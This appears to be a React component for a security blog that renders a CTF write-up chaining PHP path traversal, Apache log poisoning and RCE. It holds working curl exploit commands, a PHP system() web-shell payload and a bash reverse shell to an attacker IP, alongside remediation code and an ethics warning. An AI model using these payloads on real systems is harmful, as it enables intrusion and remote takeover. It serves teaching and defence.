"use client"

import { useEffect, useState } from "react"
import { ArrowLeft, Clock, List, Tag } from "lucide-react"
import { writeups } from "@/lib/data"
import { CodeBlock } from "./code-block"
import { Callout } from "./callout"

const toc = [
  { id: "overview", label: "1. Overview" },
  { id: "recon", label: "2. Reconnaissance" },
  { id: "traversal", label: "3. The Traversal Bug" },
  { id: "poisoning", label: "4. Log Poisoning" },
  { id: "rce", label: "5. Gaining RCE" },
  { id: "remediation", label: "6. Remediation" },
]

export function WriteupDetail({ slug, onBack }: { slug: string; onBack: () => void }) {
  const post = writeups.find((w) => w.slug === slug) ?? writeups[0]
  const [activeId, setActiveId] = useState(toc[0].id)

  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) setActiveId(entry.target.id)
        })
      },
      { rootMargin: "-20% 0px -70% 0px", threshold: 0 },
    )
    toc.forEach(({ id }) => {
      const el = document.getElementById(id)
      if (el) observer.observe(el)
    })
    return () => observer.disconnect()
  }, [])

  return (
    <article className="mx-auto max-w-6xl">
      <button
        onClick={onBack}
        className="mb-8 inline-flex items-center gap-2 font-mono text-sm text-muted-foreground transition-colors hover:text-primary"
      >
        <ArrowLeft className="h-4 w-4" /> back to write-ups
      </button>

      <div className="lg:grid lg:grid-cols-[1fr_240px] lg:gap-10">
        {/* Article body */}
        <div className="min-w-0">
          <header className="border-b border-border pb-6">
            <div className="flex flex-wrap items-center gap-2 font-mono text-xs text-muted-foreground">
              <span className="rounded border border-destructive/40 px-2 py-0.5 text-destructive">
                {post.difficulty}
              </span>
              <span>{post.platform}</span>
              <span className="flex items-center gap-1">
                <Clock className="h-3.5 w-3.5" /> {post.readTime}
              </span>
              <span>{post.date}</span>
            </div>
            <h1 className="mt-4 text-3xl font-bold leading-tight text-glow md:text-4xl">
              {post.title}
            </h1>
            <div className="mt-4 flex flex-wrap items-center gap-1.5">
              <Tag className="h-3.5 w-3.5 text-muted-foreground" />
              {post.tags.map((t) => (
                <span
                  key={t}
                  className="rounded bg-secondary/70 px-2 py-0.5 font-mono text-[11px] text-accent"
                >
                  {t}
                </span>
              ))}
            </div>
          </header>

          <div className="prose-invert max-w-none pt-6 text-[15px] leading-relaxed text-foreground/85">
            <Section id="overview" title="1. Overview">
              <p>
                This box exposed a file-download endpoint that accepted a user-controlled{" "}
                <Code>file</Code> parameter. In this write-up we walk through the full chain,
                one step at a time, from spotting the traversal to landing a shell. If you are
                new to this class of bug, follow along in a lab &mdash; never against systems you
                do not own.
              </p>
              <Callout variant="warning" title="Legal & Ethics">
                Everything here was performed in an isolated CTF environment. Testing these
                techniques against systems without explicit written authorization is illegal.
              </Callout>
            </Section>

            <Section id="recon" title="2. Reconnaissance">
              <p>
                We start by mapping the application surface and looking for endpoints that touch
                the filesystem. A quick <Code>curl</Code> reveals a download handler:
              </p>
              <CodeBlock
                language="bash"
                filename="recon.sh"
                code={`# Enumerate the download endpoint
curl -s "http://10.10.11.42/download?file=report.pdf" -o report.pdf

# Probe with a single traversal sequence
curl -s "http://10.10.11.42/download?file=../../../../etc/passwd"`}
              />
              <p>
                The second request returns the contents of <Code>/etc/passwd</Code> &mdash; a
                strong signal that user input flows straight into a file path with no
                normalization.
              </p>
            </Section>

            <Section id="traversal" title="3. The Traversal Bug">
              <p>
                The vulnerable handler concatenates the parameter directly onto a base directory.
                Notice there is no canonicalization or allow-list check:
              </p>
              <CodeBlock
                language="php"
                filename="download.php"
                code={`<?php
$base = "/var/www/files/";
$file = $_GET["file"];          // attacker-controlled
$path = $base . $file;          // no normalization!
readfile($path);                // arbitrary file read
?>`}
              />
              <Callout variant="info" title="Why it works">
                Because <Code>../</Code> sequences are resolved by the OS at read time, we can
                climb out of <Code>/var/www/files/</Code> and read any file the web user can
                access.
              </Callout>
            </Section>

            <Section id="poisoning" title="4. Log Poisoning">
              <p>
                A read primitive is useful, but we want code execution. Since we can read the
                Apache access log, we can also <em>poison</em> it: the server records our
                User-Agent verbatim. We inject a small PHP payload into that header.
              </p>
              <CodeBlock
                language="bash"
                filename="poison.sh"
                code={`# Send a request with a PHP payload in the User-Agent
curl -s "http://10.10.11.42/" \\
  -H 'User-Agent: <?php system($_GET["cmd"]); ?>'`}
              />
              <Callout variant="danger" title="High Impact">
                Once the log contains executable PHP, reading it through the traversal bug causes
                the interpreter to run our payload. This is the pivot from read to execute.
              </Callout>
            </Section>

            <Section id="rce" title="5. Gaining RCE">
              <p>
                Now we include the poisoned log through the traversal parameter and pass a{" "}
                <Code>cmd</Code> to execute:
              </p>
              <CodeBlock
                language="bash"
                filename="exploit.sh"
                code={`# Trigger execution of our injected payload
curl -s "http://10.10.11.42/download?file=../../../../var/log/apache2/access.log&cmd=id"

# uid=33(www-data) gid=33(www-data) groups=33(www-data)`}
              />
              <p>
                We confirm execution as <Code>www-data</Code>, then upgrade to an interactive
                reverse shell:
              </p>
              <CodeBlock
                language="bash"
                filename="shell.sh"
                code={`# Listener on our machine
nc -lvnp 4444

# URL-encoded reverse shell via the cmd parameter
cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.7/4444+0>%261'`}
              />
              <Callout variant="tip" title="Stabilize the shell">
                Upgrade with <Code>python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</Code>{" "}
                then background with <Code>Ctrl+Z</Code> and run <Code>stty raw -echo; fg</Code>.
              </Callout>
            </Section>

            <Section id="remediation" title="6. Remediation">
              <p>The root causes and their fixes:</p>
              <ul className="my-4 list-disc space-y-2 pl-5 marker:text-primary">
                <li>Resolve and canonicalize the path, then verify it stays within the base directory.</li>
                <li>Use an allow-list of known file identifiers instead of raw filenames.</li>
                <li>Serve downloads from a location where logs are never web-accessible.</li>
              </ul>
              <CodeBlock
                language="php"
                filename="fixed.php"
                code={`<?php
$base = realpath("/var/www/files/");
$req  = realpath($base . "/" . basename($_GET["file"]));
if ($req === false || strpos($req, $base) !== 0) {
    http_response_code(403);
    exit("forbidden");
}
readfile($req);
?>`}
              />
            </Section>
          </div>
        </div>

        {/* Sticky TOC */}
        <aside className="hidden lg:block">
          <div className="sticky top-24">
            <p className="flex items-center gap-2 border-b border-border pb-3 font-mono text-xs uppercase tracking-widest text-muted-foreground">
              <List className="h-4 w-4" /> On this page
            </p>
            <nav className="mt-3">
              <ul className="space-y-1 border-l border-border">
                {toc.map(({ id, label }) => (
                  <li key={id}>
                    <a
                      href={`#${id}`}
                      className={`-ml-px block border-l-2 py-1.5 pl-4 font-mono text-[13px] transition-colors ${
                        activeId === id
                          ? "border-primary text-primary"
                          : "border-transparent text-muted-foreground hover:text-foreground"
                      }`}
                    >
                      {label}
                    </a>
                  </li>
                ))}
              </ul>
            </nav>
          </div>
        </aside>
      </div>
    </article>
  )
}

function Section({
  id,
  title,
  children,
}: {
  id: string
  title: string
  children: React.ReactNode
}) {
  return (
    <section id={id} className="scroll-mt-24 pb-8">
      <h2 className="mb-3 font-mono text-xl font-bold text-foreground">{title}</h2>
      {children}
    </section>
  )
}

function Code({ children }: { children: React.ReactNode }) {
  return (
    <code className="rounded bg-secondary px-1.5 py-0.5 font-mono text-[13px] text-accent">
      {children}
    </code>
  )
}
